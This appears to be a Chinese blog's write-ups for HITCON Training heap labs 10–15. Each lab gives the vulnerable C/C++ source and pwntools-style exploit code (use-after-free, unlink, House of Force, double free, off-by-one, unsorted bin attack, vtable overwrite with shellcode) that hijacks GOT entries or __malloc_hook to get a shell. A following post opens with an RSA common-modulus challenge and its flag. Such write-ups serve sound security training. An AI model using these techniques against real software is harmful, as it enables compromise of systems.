|| idx\u0026gt;= count){ puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if(notelist[idx]){ free(notelist[idx]-\u0026gt;content); free(notelist[idx]); puts(\u0026#34;Success\u0026#34;); } } void print_note(){ char buf[4]; int idx ; printf(\u0026#34;Index :\u0026#34;); read(0,buf,4); idx = atoi(buf); if(idx \u0026lt; 0 || idx\u0026gt;= count){ puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if(notelist[idx]){ notelist[idx]-\u0026gt;printnote(notelist[idx]); } } void magic(){ system(\u0026#34;cat /home/hacknote/flag\u0026#34;); } void menu(){ puts(\u0026#34;----------------------\u0026#34;); puts(\u0026#34; HackNote\u0026#34;); puts(\u0026#34;----------------------\u0026#34;); puts(\u0026#34; 1. Add note\u0026#34;); puts(\u0026#34; 2. Delete note\u0026#34;); puts(\u0026#34; 3. Print note\u0026#34;); puts(\u0026#34; 4. Exit\u0026#34;); puts(\u0026#34;----------------------\u0026#34;); printf(\u0026#34;Your choice :\u0026#34;); }; int main(){ setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); char buf[4]; while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : add_note(); break ; case 2 : del_note(); break ; case 3 : print_note(); break ; case 4 : exit(0); break ; default : puts(\u0026#34;Invalid choice\u0026#34;); break ; } } return 0; } 经典的 uaf 利用，做法和 ACTF2019-babyheap 以及 BJDCTF2019-YDSneedGirlfriend 完全相同。\nadd(0x10) add(0x10) delete(0) delete(1) add(0x8,p32(elf.sym[\u0026#39;magic\u0026#39;])) show(0) lab11 - bamboobox # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; struct item{ int size ; char *name ; }; struct item itemlist[100] = {0}; int num ; void hello_message(){ puts(\u0026#34;There is a box with magic\u0026#34;); puts(\u0026#34;what do you want to do in the box\u0026#34;); } void goodbye_message(){ puts(\u0026#34;See you next time\u0026#34;); puts(\u0026#34;Thanks you\u0026#34;); } struct box{ void (*hello_message)(); void (*goodbye_message)(); }; void menu(){ puts(\u0026#34;----------------------------\u0026#34;); puts(\u0026#34;Bamboobox Menu\u0026#34;); puts(\u0026#34;----------------------------\u0026#34;); puts(\u0026#34;1.show the items in the box\u0026#34;); puts(\u0026#34;2.add a new item\u0026#34;); puts(\u0026#34;3.change the item in the box\u0026#34;); puts(\u0026#34;4.remove the item in the box\u0026#34;); puts(\u0026#34;5.exit\u0026#34;); puts(\u0026#34;----------------------------\u0026#34;); printf(\u0026#34;Your choice:\u0026#34;); } void show_item(){ int i ; if(!num){ puts(\u0026#34;No item in the box\u0026#34;); }else{ for(i = 0 ; i \u0026lt; 100; i++){ if(itemlist[i].name){ printf(\u0026#34;%d : %s\u0026#34;,i,itemlist[i].name); } } puts(\u0026#34;\u0026#34;); } } int add_item(){ char sizebuf[8] ; int length ; int i ; int size ; if(num \u0026lt; 100){ printf(\u0026#34;Please enter the length of item name:\u0026#34;); read(0,sizebuf,8); length = atoi(sizebuf); if(length == 0){ puts(\u0026#34;invaild length\u0026#34;); return 0; } for(i = 0 ; i \u0026lt; 100 ; i++){ if(!itemlist[i].name){ itemlist[i].size = length ; itemlist[i].name = (char*)malloc(length); printf(\u0026#34;Please enter the name of item:\u0026#34;); size = read(0,itemlist[i].name,length); itemlist[i].name[size] = \u0026#39;\\x00\u0026#39;; num++; break; } } }else{ puts(\u0026#34;the box is full\u0026#34;); } return 0; } void change_item(){ char indexbuf[8] ; char lengthbuf[8]; int length ; int index ; int readsize ; if(!num){ puts(\u0026#34;No item in the box\u0026#34;); }else{ printf(\u0026#34;Please enter the index of item:\u0026#34;); read(0,indexbuf,8); index = atoi(indexbuf); if(itemlist[index].name){ printf(\u0026#34;Please enter the length of item name:\u0026#34;); read(0,lengthbuf,8); length = atoi(lengthbuf); printf(\u0026#34;Please enter the new name of the item:\u0026#34;); readsize = read(0,itemlist[index].name,length); *(itemlist[index].name + readsize) = \u0026#39;\\x00\u0026#39;; }else{ puts(\u0026#34;invaild index\u0026#34;); } } } void remove_item(){ char indexbuf[8] ; int index ; if(!num){ puts(\u0026#34;No item in the box\u0026#34;); }else{ printf(\u0026#34;Please enter the index of item:\u0026#34;); read(0,indexbuf,8); index = atoi(indexbuf); if(itemlist[index].name){ free(itemlist[index].name); itemlist[index].name = 0 ; itemlist[index].size = 0 ; puts(\u0026#34;remove successful!!\u0026#34;); num-- ; }else{ puts(\u0026#34;invaild index\u0026#34;); } } } void magic(){ int fd ; char buffer[100]; fd = open(\u0026#34;/home/bamboobox/flag\u0026#34;,O_RDONLY); read(fd,buffer,sizeof(buffer)); close(fd); printf(\u0026#34;%s\u0026#34;,buffer); exit(0); } int main(){ char choicebuf[8]; int choice; struct box *bamboo ; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); bamboo = malloc(sizeof(struct box)); bamboo-\u0026gt;hello_message = hello_message; bamboo-\u0026gt;goodbye_message = goodbye_message ; bamboo-\u0026gt;hello_message(); while(1){ menu(); read(0,choicebuf,8); choice = atoi(choicebuf); switch(choice){ case 1: show_item(); break; case 2: add_item(); break; case 3: change_item(); break; case 4: remove_item(); break; case 5: bamboo-\u0026gt;goodbye_message(); exit(0); break; default: puts(\u0026#34;invaild choice!!!\u0026#34;); break; } } return 0 ; } 存在全局数组 itemlist，第一种办法就是利用它进行 unlink，劫持 atoi 到 magic：\nptr = 0x6020c8 add(0x80) add(0x80) add(0x80) fd = ptr-0x18 bk = ptr-0x10 payload = flat(0,0x81,fd,bk,\u0026#39;a\u0026#39;*0x60,0x80,0x90) edit(0,len(payload),payload) delete(1) # hijack to magic payload = flat(0,0,0,elf.got[\u0026#39;atoi\u0026#39;]) edit(0,len(payload),payload) edit(0,0x8,p64(elf.sym[\u0026#39;magic\u0026#39;])) sla(\u0026#39;choice:\u0026#39;,\u0026#39;5\u0026#39;) 或者劫持到 system 也可以：\n# OR hijack to system payload = flat(0,0,0,elf.got[\u0026#39;atoi\u0026#39;]) edit(0,len(payload),payload) show() ru(\u0026#39;0 :\u0026#39;) atoi = uu64(ru(\u0026#39;2 :\u0026#39;)) system,binsh = ret2libc(atoi,\u0026#39;atoi\u0026#39;) edit(0,0x8,p64(system)) sla(\u0026#39;choice:\u0026#39;,\u0026#39;/bin/sh\\x00\u0026#39;) 第二种办法是 House of Force。程序开头就 malloc 了 0x10 的 box 用来放两个函数，其中第二个会在退出时调用，我们只需要覆盖第二个函数为 magic 即可。先通过溢出修改 top chunk 大小为 - 1，然后计算 evil_size：减去自身大小以及 box 的大小，再减去一个头部的大小即可。这种方法简单了很多。\nadd(0x60) edit(0,0x70,flat(\u0026#39;a\u0026#39;*0x60,0,0xffffffffffffffff)) evil_size = -(0x60+0x10) - (0x10+0x10) - 0x10 add(evil_size) add(0x10,p64(elf.sym[\u0026#39;magic\u0026#39;])*2) sla(\u0026#39;choice:\u0026#39;,\u0026#39;5\u0026#39;) lab12 - secretgarden # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #define TIMEOUT 60 struct flower{ int vaild ; char *name ; char color[24] ; }; struct flower* flowerlist[100] ; unsigned int flowercount = 0 ; void menu(){ puts(\u0026#34;\u0026#34;); puts(\u0026#34;☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆\u0026#34;); puts(\u0026#34;☆ Baby Secret Garden ☆\u0026#34;); puts(\u0026#34;☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆\u0026#34;); puts(\u0026#34;\u0026#34;); puts(\u0026#34; 1 . Raise a flower\u0026#34;); puts(\u0026#34; 2 . Visit the garden\u0026#34;); puts(\u0026#34; 3 . Remove a flower from the garden\u0026#34;); puts(\u0026#34; 4 . Clean the garden\u0026#34;); puts(\u0026#34; 5 . Leave the garden\u0026#34;); puts(\u0026#34;\u0026#34;); printf(\u0026#34;Your choice :\u0026#34;); } int add(){ struct flower *newflower = NULL ; char *buf = NULL ; unsigned size =0; unsigned index ; if(flowercount \u0026lt; 100){ newflower = malloc(sizeof(struct flower)); memset(newflower,0,sizeof(struct flower)); printf(\u0026#34;Length of the name :\u0026#34;); if(scanf(\u0026#34;%u\u0026#34;,\u0026amp;size)== EOF) exit(-1); buf = (char*)malloc(size); if(!buf){ puts(\u0026#34;Alloca error !!\u0026#34;); exit(-1); } printf(\u0026#34;The name of flower :\u0026#34;); read(0,buf,size); newflower-\u0026gt;name = buf ; printf(\u0026#34;The color of the flower :\u0026#34;); scanf(\u0026#34;%23s\u0026#34;,newflower-\u0026gt;color); newflower-\u0026gt;vaild = 1 ; for(index = 0 ; index \u0026lt; 100 ; index++){ if(!flowerlist[index]){ flowerlist[index] = newflower ; break ; } } flowercount++ ; puts(\u0026#34;Successful !\u0026#34;); }else{ puts(\u0026#34;The garden is overflow\u0026#34;); } } int del(){ unsigned int index ; if(!flowercount){ puts(\u0026#34;No flower in the garden\u0026#34;); }else{ printf(\u0026#34;Which flower do you want to remove from the garden:\u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;index); if(index \u0026lt; 0 ||index\u0026gt;= 100 || !flowerlist[index]){ puts(\u0026#34;Invalid choice\u0026#34;); return 0 ; } (flowerlist[index])-\u0026gt;vaild = 0 ; free((flowerlist[index])-\u0026gt;name); puts(\u0026#34;Successful\u0026#34;); } } void magic(){ int fd ; char buffer[100]; fd = open(\u0026#34;/home/babysecretgarden/flag\u0026#34;,O_RDONLY); read(fd,buffer,sizeof(buffer)); close(fd); printf(\u0026#34;%s\u0026#34;,buffer); exit(0); } void clean(){ unsigned index ; for(index = 0 ; index \u0026lt; 100 ; index++){ if(flowerlist[index] \u0026amp;\u0026amp; (flowerlist[index])-\u0026gt;vaild == 0){ free(flowerlist[index]); flowerlist[index] = NULL; flowercount--; } } puts(\u0026#34;Done!\u0026#34;); } int visit(){ unsigned index ; if(!flowercount){ puts(\u0026#34;No flower in the garden !\u0026#34;); }else{ for(index = 0 ; index \u0026lt; 100 ; index++){ if(flowerlist[index] \u0026amp;\u0026amp; (flowerlist[index])-\u0026gt;vaild){ printf(\u0026#34;Name of the flower[%u] :%s\\n\u0026#34;,index,(flowerlist[index])-\u0026gt;name); printf(\u0026#34;Color of the flower[%u] :%s\\n\u0026#34;,index,(flowerlist[index])-\u0026gt;color); } } } } void handler(int signum){ puts(\u0026#34;timeout\u0026#34;); exit(1); } void init(){ int fd; fd = open(\u0026#34;/dev/urandom\u0026#34;,0); close(fd); setvbuf(stdout,0,2,0); signal(SIGALRM,handler); alarm(TIMEOUT); } int main(){ init(); int choice ; char buf[10]; while(1){ menu(); read(0,buf,8); choice = atoi(buf); switch(choice){ case 1: add(); break ; case 2: visit(); break ; case 3: del(); break ; case 4: clean(); break ; case 5: puts(\u0026#34;See you next time.\u0026#34;); exit(0); default : puts(\u0026#34;Invalid choice\u0026#34;); break ; } } } 在删除时存在 double free，利用漏洞修改 puts@got 为 magic 即可。\nadd(0x50) # 0 add(0x50) # 1 free(0) free(1) free(0) fake = 0x601ffa add(0x50,p64(fake)) add(0x50) add(0x50) add(0x50,flat(\u0026#39;a\u0026#39;*6,0,elf.sym[\u0026#39;magic\u0026#39;],elf.sym[\u0026#39;magic\u0026#39;])) 另一种方法是直接 getshell。先通过 unsorted bin 泄露 libc，然后用同样的方法修改 __malloc_hook 为 one_gadget，最后触发 double free 检测调用 malloc_printerr，从而调用 __malloc_hook。\nadd(0x80) add(0x68) add(0x68) free(0) clean() add(0x80) show() ru(\u0026#39;a\u0026#39;*8) base = uu64(r(6))-88-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) malloc_hook = base+libc.sym[\u0026#39;__malloc_hook\u0026#39;] free(1) free(2) free(1) add(0x68,p64(malloc_hook-0x23)) add(0x68) add(0x68) add(0x68,\u0026#39;a\u0026#39;*0x13+p64(base+one[2])) free(1) free(1) lab13 - heapcreator # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret \u0026lt;=0){ puts(\u0026#34;Error\u0026#34;); _exit(-1); } } struct heap { size_t size ; char *content ; }; struct heap *heaparray[10]; void menu(){ puts(\u0026#34;--------------------------------\u0026#34;); puts(\u0026#34; Heap Creator\u0026#34;); puts(\u0026#34;--------------------------------\u0026#34;); puts(\u0026#34; 1. Create a Heap\u0026#34;); puts(\u0026#34; 2. Edit a Heap\u0026#34;); puts(\u0026#34; 3. Show a Heap\u0026#34;); puts(\u0026#34; 4. Delete a Heap\u0026#34;); puts(\u0026#34; 5. Exit\u0026#34;); puts(\u0026#34;--------------------------------\u0026#34;); printf(\u0026#34;Your choice :\u0026#34;); } void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i \u0026lt; 10 ; i++){ if(!heaparray[i]){ heaparray[i] = (struct heap *)malloc(sizeof(struct heap)); if(!heaparray[i]){ puts(\u0026#34;Allocate Error\u0026#34;); exit(1); } printf(\u0026#34;Size of Heap :\u0026#34;); read(0,buf,8); size = atoi(buf); heaparray[i]-\u0026gt;content = (char *)malloc(size); if(!heaparray[i]-\u0026gt;content){ puts(\u0026#34;Allocate Error\u0026#34;); exit(2); } heaparray[i]-\u0026gt;size = size ; printf(\u0026#34;Content of heap:\u0026#34;); read_input(heaparray[i]-\u0026gt;content,size); puts(\u0026#34;SuccessFul\u0026#34;); break ; } } } void edit_heap(){ int idx ; char buf[4]; printf(\u0026#34;Index :\u0026#34;); read(0,buf,4); idx = atoi(buf); if(idx \u0026lt; 0 || idx\u0026gt;= 10){ puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if(heaparray[idx]){ printf(\u0026#34;Content of heap :\u0026#34;); read_input(heaparray[idx]-\u0026gt;content,heaparray[idx]-\u0026gt;size+1); puts(\u0026#34;Done !\u0026#34;); }else{ puts(\u0026#34;No such heap !\u0026#34;); } } void show_heap(){ int idx ; char buf[4]; printf(\u0026#34;Index :\u0026#34;); read(0,buf,4); idx = atoi(buf); if(idx \u0026lt; 0 || idx\u0026gt;= 10){ puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if(heaparray[idx]){ printf(\u0026#34;Size : %ld\\nContent : %s\\n\u0026#34;,heaparray[idx]-\u0026gt;size,heaparray[idx]-\u0026gt;content); puts(\u0026#34;Done !\u0026#34;); }else{ puts(\u0026#34;No such heap !\u0026#34;); } } void delete_heap(){ int idx ; char buf[4]; printf(\u0026#34;Index :\u0026#34;); read(0,buf,4); idx = atoi(buf); if(idx \u0026lt; 0 || idx\u0026gt;= 10){ puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]-\u0026gt;content); free(heaparray[idx]); heaparray[idx] = NULL ; puts(\u0026#34;Done !\u0026#34;); }else{ puts(\u0026#34;No such heap !\u0026#34;); } } int main(){ char buf[4]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : show_heap(); break ; case 4 : delete_heap(); break ; case 5 : exit(0); break ; default : puts(\u0026#34;Invalid Choice\u0026#34;); break; } } return 0 ; } 本题添加堆时没有检查 size，可以整数溢出；编辑堆时存在人为设置的 off by one，因此可以覆盖下一个 chunk 的 chunk_size 造成堆块重叠。我们先申请 0x18 的 chunk，需要注意必须以 8 结尾以覆盖到 chunk_size，然后申请 0x10 的 victim，利用 off by one 修改 victim 的 chunk_size 为 0x41 后，释放 victim。\n我们知道，原来的 victim 指针是 0x20 的 chunk，victim 的内容也是 0x20 的 chunk。现在 victim 指针变成了 0x40，那么我们可以申请 0x30 的 chunk，使得新 chunk 内容使用的是 victim 的指针 chunk，而新 chunk 的指针使用的是 victim 的内容 chunk。这样我们就能控制整个 victim 了。确保指针内的 heapsize 合法，然后在 content 对应位置放上要泄露 / 覆盖的函数 GOT，通过 libc 泄露得到 system，最后用 system 劫持 GOT 即可。\nadd(0x18) # 0 add(0x10) # 1 edit(0,\u0026#39;a\u0026#39;*0x18+\u0026#39;\\x41\u0026#39;) delete(1) # new heap-\u0026gt;content = heap1-\u0026gt;ptr # new heap-\u0026gt;ptr = heap1-\u0026gt;content add(0x30,flat(0,0,0,0,0x30,elf.got[\u0026#39;atoi\u0026#39;])) show(1) ru(\u0026#39;Content :\u0026#39;) atoi = uu64(r(6)) system,binsh = ret2libc(atoi,\u0026#39;atoi\u0026#39;) edit(1,p64(system)) sla(\u0026#39;choice :\u0026#39;,\u0026#39;sh\\x00\\x00\u0026#39;) lab14 - magicheap # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret \u0026lt;=0){ puts(\u0026#34;Error\u0026#34;); _exit(-1); } } char *heaparray[10]; unsigned long int magic = 0 ; void menu(){ puts(\u0026#34;--------------------------------\u0026#34;); puts(\u0026#34; Magic Heap Creator\u0026#34;); puts(\u0026#34;--------------------------------\u0026#34;); puts(\u0026#34; 1. Create a Heap\u0026#34;); puts(\u0026#34; 2. Edit a Heap\u0026#34;); puts(\u0026#34; 3. Delete a Heap\u0026#34;); puts(\u0026#34; 4. Exit\u0026#34;); puts(\u0026#34;--------------------------------\u0026#34;); printf(\u0026#34;Your choice :\u0026#34;); } void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i \u0026lt; 10 ; i++){ if(!heaparray[i]){ printf(\u0026#34;Size of Heap :\u0026#34;); read(0,buf,8); size = atoi(buf); heaparray[i] = (char *)malloc(size); if(!heaparray[i]){ puts(\u0026#34;Allocate Error\u0026#34;); exit(2); } printf(\u0026#34;Content of heap:\u0026#34;); read_input(heaparray[i],size); puts(\u0026#34;SuccessFul\u0026#34;); break ; } } } void edit_heap(){ int idx ; char buf[4]; size_t size ; printf(\u0026#34;Index :\u0026#34;); read(0,buf,4); idx = atoi(buf); if(idx \u0026lt; 0 || idx\u0026gt;= 10){ puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if(heaparray[idx]){ printf(\u0026#34;Size of Heap :\u0026#34;); read(0,buf,8); size = atoi(buf); printf(\u0026#34;Content of heap :\u0026#34;); read_input(heaparray[idx] ,size); puts(\u0026#34;Done !\u0026#34;); }else{ puts(\u0026#34;No such heap !\u0026#34;); } } void delete_heap(){ int idx ; char buf[4]; printf(\u0026#34;Index :\u0026#34;); read(0,buf,4); idx = atoi(buf); if(idx \u0026lt; 0 || idx\u0026gt;= 10){ puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]); heaparray[idx] = NULL ; puts(\u0026#34;Done !\u0026#34;); }else{ puts(\u0026#34;No such heap !\u0026#34;); } } void l33t(){ system(\u0026#34;cat /home/magicheap/flag\u0026#34;); } int main(){ char buf[8]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,8); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : delete_heap(); break ; case 4 : exit(0); break ; case 4869 : if(magic\u0026gt; 4869){ puts(\u0026#34;Congrt !\u0026#34;); l33t(); }else puts(\u0026#34;So sad !\u0026#34;); break ; default : puts(\u0026#34;Invalid Choice\u0026#34;); break; } } return 0 ; } 在 edit 时没有检查 size，可以堆溢出。题目要求 bss 段的 magic 大于 0x1305，且输入数字等于 0x1305，即可 getshell。那么我们释放一个 chunk 到 unsorted bin，利用堆溢出修改其 bk 为 magic-0x10，再申请回来，那么 magic 就会被认为是下一个 unsorted chunk 的 fd，被填入 main_arena+88，这个值远超 0x1305。\nadd(0x10) # 0 add(0x80) # 1 add(0x10) # 2 delete(1) magic = 0x6020a0 fd = 0 bk = magic-0x10 payload = flat(\u0026#39;a\u0026#39;*0x10,0,0x91,fd,bk) edit(0,len(payload),payload) add(0x80) sla(\u0026#39;:\u0026#39;,str(0x1305)) lab15 - zoo # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;string.h\u0026gt; using namespace std; char nameofzoo[100]; class Animal { public : Animal(){ memset(name,0,24); weight = 0; } virtual void speak(){;} virtual void info(){;} protected : char name[24]; int weight; }; class Dog : public Animal{ public : Dog(string str,int w){ strcpy(name,str.c_str()); weight = w ; } virtual void speak(){ cout \u0026lt;\u0026lt;\u0026#34;Wow ~ Wow ~ Wow ~\u0026#34; \u0026lt;\u0026lt; endl ; } virtual void info(){ cout \u0026lt;\u0026lt;\u0026#34;|---------------------|\u0026#34; \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34;| Animal info |\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt;\u0026#34;|---------------------|\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt;\u0026#34; Weight :\u0026#34;\u0026lt;\u0026lt; this-\u0026gt;weight \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34; Name : \u0026#34;\u0026lt;\u0026lt; this-\u0026gt;name \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34;|---------------------|\u0026#34; \u0026lt;\u0026lt; endl; } }; class Cat : public Animal{ public : Cat(string str,int w){ strcpy(name,str.c_str()); weight = w ; } virtual void speak(){ cout \u0026lt;\u0026lt;\u0026#34;Meow ~ Meow ~ Meow ~\u0026#34; \u0026lt;\u0026lt; endl ; } virtual void info(){ cout \u0026lt;\u0026lt;\u0026#34;|---------------------|\u0026#34; \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34;| Animal info |\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt;\u0026#34;|---------------------|\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt;\u0026#34; Weight :\u0026#34;\u0026lt;\u0026lt; this-\u0026gt;weight \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34; Name : \u0026#34;\u0026lt;\u0026lt; this-\u0026gt;name \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34;|---------------------|\u0026#34; \u0026lt;\u0026lt; endl; } }; vector\u0026lt;Animal *\u0026gt; animallist ; void menu(){ cout \u0026lt;\u0026lt;\u0026#34;*********************************\u0026#34; \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34; 1. Add a dog \u0026#34; \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34; 2. Add a cat \u0026#34; \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34; 3. Listen a animal \u0026#34; \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34; 4. Show a animal info \u0026#34; \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34; 5. Remove a animal \u0026#34; \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34; 6. Exit \u0026#34; \u0026lt;\u0026lt; endl ; cout \u0026lt;\u0026lt;\u0026#34;*********************************\u0026#34; \u0026lt;\u0026lt; endl ; } void adddog(){ string name ; int weight ; cout \u0026lt;\u0026lt;\u0026#34;Name : \u0026#34; ; cin \u0026gt;\u0026gt; name; cout \u0026lt;\u0026lt;\u0026#34;Weight : \u0026#34; ; cin \u0026gt;\u0026gt; weight ; Dog *mydog = new Dog(name,weight); animallist.push_back(mydog); } void addcat(){ string name ; int weight ; cout \u0026lt;\u0026lt;\u0026#34;Name : \u0026#34; ; cin \u0026gt;\u0026gt; name; cout \u0026lt;\u0026lt;\u0026#34;Weight : \u0026#34; ; cin \u0026gt;\u0026gt; weight ; Cat *mycat = new Cat(name,weight); animallist.push_back(mycat); } void remove(){ unsigned int idx ; if(animallist.size() == 0){ cout \u0026lt;\u0026lt;\u0026#34;no any animal!\u0026#34; \u0026lt;\u0026lt; endl ; return ; } cout \u0026lt;\u0026lt;\u0026#34;index of animal : \u0026#34;; cin \u0026gt;\u0026gt; idx ; if(idx\u0026gt;= animallist.size()){ cout \u0026lt;\u0026lt;\u0026#34;out of bound !\u0026#34; \u0026lt;\u0026lt; endl; return ; } delete animallist[idx]; animallist.erase(animallist.begin()+idx); } void showinfo(){ unsigned int idx ; if(animallist.size() == 0){ cout \u0026lt;\u0026lt;\u0026#34;no any animal!\u0026#34; \u0026lt;\u0026lt; endl ; return ; } cout \u0026lt;\u0026lt;\u0026#34;index of animal : \u0026#34;; cin \u0026gt;\u0026gt; idx ; if(idx\u0026gt;= animallist.size()){ cout \u0026lt;\u0026lt;\u0026#34;out of bound !\u0026#34; \u0026lt;\u0026lt; endl; return ; } animallist[idx]-\u0026gt;info(); } void listen(){ unsigned int idx ; if(animallist.size() == 0){ cout \u0026lt;\u0026lt;\u0026#34;no any animal!\u0026#34; \u0026lt;\u0026lt; endl ; return ; } cout \u0026lt;\u0026lt;\u0026#34;index of animal : \u0026#34;; cin \u0026gt;\u0026gt; idx ; if(idx\u0026gt;= animallist.size()){ cout \u0026lt;\u0026lt;\u0026#34;out of bound !\u0026#34; \u0026lt;\u0026lt; endl; return ; } animallist[idx]-\u0026gt;speak(); } int main(void){ unsigned int choice ; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); cout \u0026lt;\u0026lt;\u0026#34;Name of Your zoo :\u0026#34; ; read(0,nameofzoo,100); while(1){ menu(); cout \u0026lt;\u0026lt;\u0026#34;Your choice :\u0026#34;; cin \u0026gt;\u0026gt; choice ; cout \u0026lt;\u0026lt; endl ; switch(choice){ case 1 : adddog(); break ; case 2 : addcat(); break ; case 3 : listen(); break ; case 4 : showinfo(); break ; case 5 : remove(); break ; case 6 : _exit(0); default : cout \u0026lt;\u0026lt;\u0026#34;Invaild choice\u0026#34; \u0026lt;\u0026lt; endl; break ; } } return 0 ; } 在 Dog 和 Cat 的构造函数中存在未检查长度的 strcpy，因此可以堆溢出。同时，本题关闭了 NX，而 Dog 中存在虚表指针，因此可以将其覆盖为 shellcode 地址的地址。那么 shellcode 和 shellcode 地址分别在哪呢？我们可以在程序第一次输入时布置 shellcode，在后面跟上 shellcode 所在地址。\nname = 0x605420 shellcode = asm(shellcraft.sh()) sla(\u0026#39;zoo\u0026#39;,shellcode+p64(name)) add() add() free(0) add(\u0026#39;a\u0026#39;*72+p64(name+len(shellcode))) sla(\u0026#39;choice :\u0026#39;,3) sla(\u0026#39;:\u0026#39;,0) ","date":"2020-02-16","permalink":"/posts/hitcon-training/","section":"Posts","summary":"\u003cp\u003eHITCON Training 更新完成，没咕咕。其中堆题真是很适合入门。\u003c/p\u003e","title":"HITCON Training 练习记录"},{"content":"","date":"2020-02-15","permalink":"/tags/rsa/","section":"Tags","summary":"","title":"RSA"},{"content":"","date":"2020-02-15","permalink":"/categories/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/","section":"Categories","summary":"","title":"比赛记录"},{"content":"","date":"2020-02-15","permalink":"/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%B8%8E%E7%BC%96%E7%A0%81/","section":"Tags","summary":"","title":"古典密码与编码"},{"content":"第一次出题，经验不足，感谢参赛选手海涵。\n这次给队内新人赛出题，题目设置得比较简单，共有：\nWeb * 5 Pwn * 5 Misc * 4 Crypto * 3 Reverse * 3 我负责出 Pwn 和 Reverse、Crypto 的签到题、以及两题 Web。这里就写下我负责出的题的 wp。\nCrypto # Ridicule # 首先是没有绕任何弯的 RSA 共模攻击。题目描述说同一条消息发送了两次，可以很容易想到这个方法。原理详见 CTF Wiki。\n这里给出加密和解密的脚本：\nfrom Crypto.Util import number from gmpy2 import * # enc n_length = 2048 p = number.getPrime(n_length) q = number.getPrime(n_length) n = p*q print(n) phi = (p-1)*(q-1) e1 = 65537 e2 = 395327 d1 = invert(e1,phi) d2 = invert(e2,phi) #flag = b\u0026#39;flag{rS4_c0mOon_MOdu1u5_a7k}\u0026#39; flag = b\u0026#39;7=28LC$c04_\u0026gt;~@?0|~5F`Fd02f\u0026lt;N\u0026#39; flag = number.bytes_to_long(flag) c1 = powmod(flag,e1,n) c2 = powmod(flag,e2,n) print(c1) print(c2) # dec def exgcd(a,b): if b==0: return 1, 0, a x2, y2, r = exgcd(b, a%b) x1 = y2 y1 = x2-(a//b)*y2 return x1, y1, r s1,s2,t = exgcd(e1,e2) m = powmod(c1,s1,n) * powmod(c2,s2,n) % n print(number.long_to_bytes(m)) 在解密后得到了：\n7=28LC$c04_\u0026gt;~@?0|~5F`Fd02f\u0026lt;N 观察密文的字符集，不难发现是 ROT47 加密，再 ROT47 一次即解密得到了 flag。\nReverse # 我并不是很会出逆向，但是队伍里有同学需要做，于是这些题目基本都是有原题的。\nCMCS # Reverse 类签到题，虽然可以静态分析出答案，还是推荐动态调试。逆向可以发现关键函数 sub_8048708 和 sub_8048658，分析前者可知 eax 存储 